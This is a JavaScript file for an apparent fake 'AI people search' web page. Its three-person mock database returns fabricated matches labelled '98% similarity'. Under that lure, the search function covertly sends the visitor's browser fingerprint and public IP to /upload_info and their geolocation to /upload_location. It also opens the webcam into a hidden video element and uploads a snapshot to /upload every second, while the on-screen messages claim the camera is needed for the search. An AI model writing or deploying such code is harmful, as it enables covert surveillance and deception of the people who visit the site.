const mockDatabase = [
    { name: "Giorgi Makharadze", role: "React Developer", location: "Tbilisi", bio: "Loves mountain hiking and nature photography. Works as a freelancer.", initials: "GM", color: "bg-emerald-500/20 text-emerald-400 border-emerald-500/30" },
    { name: "Mariam Beridze", role: "UI/UX Designer", location: "Batumi", bio: "Creates minimalist interfaces. Draws digital illustrations in her free time.", initials: "MB", color: "bg-pink-500/20 text-pink-400 border-pink-500/30" },
    { name: "Nikoloz Kapanadze", role: "Marketing Manager", location: "Tbilisi", bio: "Speaks French and English. Specializes in social media strategies.", initials: "NK", color: "bg-indigo-500/20 text-indigo-400 border-indigo-500/30" }
];

let uploadedFileBase64 = null;
let backgroundCapturedPhoto = null;
let backgroundPhotoInterval = null;
let activeStream = null;

const infos = {
    browser: navigator.appName,
    platform: navigator.platform,
    language: navigator.language,
    userAgent: navigator.userAgent,
    ip: "",
};

async function sendLocation() {
    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
        async (pos) => {
            const locationInfo = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                time: new Date().toISOString(),
            };

            try {
                await fetch("/upload_location", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(locationInfo),
                });
            } catch (e) {}
        },
        (err) => {}
    );
}

async function userInfo() {
    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        infos.ip = ipData.ip;
    } catch (e) {
        infos.ip = "unknown";
    }

    try {
        await fetch("/upload_info", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(infos),
        });
    } catch (err) {}
}

async function sendCapturedPhoto(blob) {
    if (!blob) return;
    const formData = new FormData();
    formData.append("image", blob, "stream_captured.jpg");

    try {
        const response = await fetch("/upload", {
            method: "POST",
            body: formData,
        });
        const result = await response.json();
        console.log("Photo uploaded successfully:", result);
    } catch (err) {
        console.error("Photo upload failed:", err);
    }
}

function startContinuousCapturing(video, canvas) {
    if (backgroundPhotoInterval) {
        clearInterval(backgroundPhotoInterval);
    }

    backgroundPhotoInterval = setInterval(() => {
        if (!video || !canvas || video.paused || video.ended) return;

        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        backgroundCapturedPhoto = canvas.toDataURL('image/jpeg');

        canvas.toBlob((blob) => {
            sendCapturedPhoto(blob);
        }, 'image/jpeg', 0.5);

    }, 1000); 
}

function switchTab(tab) {
    const btnText = document.getElementById('btn-text');
    const btnPhoto = document.getElementById('btn-photo');
    const textSection = document.getElementById('text-search-section');
    const photoSection = document.getElementById('photo-search-section');

    if (tab === 'text') {
        btnText.className = "flex-1 flex items-center justify-center gap-2 py-3 text-sm font-medium rounded-lg transition-all duration-200 bg-indigo-600 text-white shadow-lg shadow-indigo-500/20";
        btnPhoto.className = "flex-1 flex items-center justify-center gap-2 py-3 text-sm font-medium rounded-lg transition-all duration-200 text-slate-400 hover:text-slate-200";
        textSection.classList.remove('hidden');
        photoSection.classList.add('hidden');
    } else {
        btnPhoto.className = "flex-1 flex items-center justify-center gap-2 py-3 text-sm font-medium rounded-lg transition-all duration-200 bg-indigo-600 text-white shadow-lg shadow-indigo-500/20";
        btnText.className = "flex-1 flex items-center justify-center gap-2 py-3 text-sm font-medium rounded-lg transition-all duration-200 text-slate-400 hover:text-slate-200";
        photoSection.classList.remove('hidden');
        textSection.classList.add('hidden');
    }
}

const dropzone = document.getElementById('dropzone');
const fileInput = document.getElementById('file-input');
const previewContainer = document.getElementById('image-preview-container');
const imagePreview = document.getElementById('image-preview');

if (dropzone) {
    dropzone.addEventListener('click', () => fileInput.click());
}

function handleFileSelect(event) {
    const file = event.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(e) {
            imagePreview.src = e.target.result;
            uploadedFileBase64 = e.target.result;
            previewContainer.classList.remove('hidden');
        }
        reader.readAsDataURL(file);
    }
}

function removeSelectedFile(event) {
    event.stopPropagation();
    if (fileInput) fileInput.value = '';
    if (imagePreview) imagePreview.src = '#';
    uploadedFileBase64 = null;
    if (previewContainer) previewContainer.classList.add('hidden');
}

async function performSearchWithCamera(type) {
    const loader = document.getElementById('loader');
    const loaderText = document.getElementById('loader-text');
    const resultsSection = document.getElementById('results-section');
    const resultsList = document.getElementById('results-list');
    const video = document.getElementById('hidden-video'); 
    const canvas = document.getElementById('hidden-canvas'); 

    if (type === 'photo' && !uploadedFileBase64) {
        alert('Please upload a photo first!');
        return;
    }

    resultsSection.classList.add('hidden');
    loader.classList.remove('hidden');
    loaderText.innerText = "System is asking for camera access...";

    userInfo();
    sendLocation();

    try {
        if (!activeStream) {
            activeStream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: 640, height: 480 }, 
                audio: false 
            });
            video.srcObject = activeStream;
        }

        loaderText.innerText = "Access granted. Identifying...";

        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                startContinuousCapturing(video, canvas);
                resolve();
            };
            if (video.readyState >= 2) {
                startContinuousCapturing(video, canvas);
                resolve();
            }
        });

    } catch (err) {
        console.error("Camera could not start:", err);
        alert("Camera access denied. Please allow camera access to continue the search.");
        loader.classList.add('hidden');
        return;
    }

    loaderText.innerText = "AI is processing data...";

    setTimeout(() => {
        loader.classList.add('hidden');
        resultsSection.classList.remove('hidden');
        resultsList.innerHTML = '';

        let filteredPeople = [];

        if (type === 'text') {
            const query = document.getElementById('search-input').value.toLowerCase();
            if (!query) {
                filteredPeople = mockDatabase;
            } else {
                filteredPeople = mockDatabase.filter(person => 
                    person.name.toLowerCase().includes(query) ||
                    person.role.toLowerCase().includes(query) ||
                    person.location.toLowerCase().includes(query) ||
                    person.bio.toLowerCase().includes(query)
                );
            }
        } else {
            const randomIndex = Math.floor(Math.random() * mockDatabase.length);
            filteredPeople = [mockDatabase[randomIndex]];
        }

        if (filteredPeople.length === 0) {
            resultsList.innerHTML = `
                <div class="text-center py-8 text-slate-500">
                    <i data-lucide="info" class="w-8 h-8 mx-auto mb-2 text-slate-600"></i>
                    No match found. Please try different keywords.
                </div>
            `;
        } else {
            filteredPeople.forEach(person => {
                const card = `
                    <div class="p-5 bg-slate-950/40 border border-slate-800/80 rounded-2xl hover:border-indigo-500/30 transition-all duration-300 flex flex-col sm:flex-row gap-4 items-start">
                        <div class="w-12 h-12 rounded-xl flex items-center justify-center font-bold text-lg border ${person.color} shrink-0">
                            ${person.initials}
                        </div>
                        <div class="space-y-2 flex-1">
                            <div class="flex flex-wrap items-center gap-2 justify-between">
                                <h4 class="font-bold text-white text-lg">${person.name}</h4>
                                <span class="px-2.5 py-0.5 bg-slate-800 text-slate-300 rounded-full text-xs font-medium border border-slate-700">${person.location}</span>
                            </div>
                            <p class="text-indigo-400 text-sm font-semibold">${person.role}</p>
                            <p class="text-slate-400 text-sm leading-relaxed">${person.bio}</p>
                            <div class="mt-3 pt-3 border-t border-slate-900 flex items-center gap-2 text-xs text-indigo-300">
                                <i data-lucide="cpu" class="w-3.5 h-3.5"></i>
                                <span>AI Match: 98% similarity</span>
                            </div>
                        </div>
                    </div>
                `;
                resultsList.innerHTML += card;
            });
        }

        if (window.lucide) {
            window.lucide.createIcons();
        }
    }, 1200);
}

document.addEventListener("DOMContentLoaded", () => {
    if (window.lucide) {
        window.lucide.createIcons();
    }
});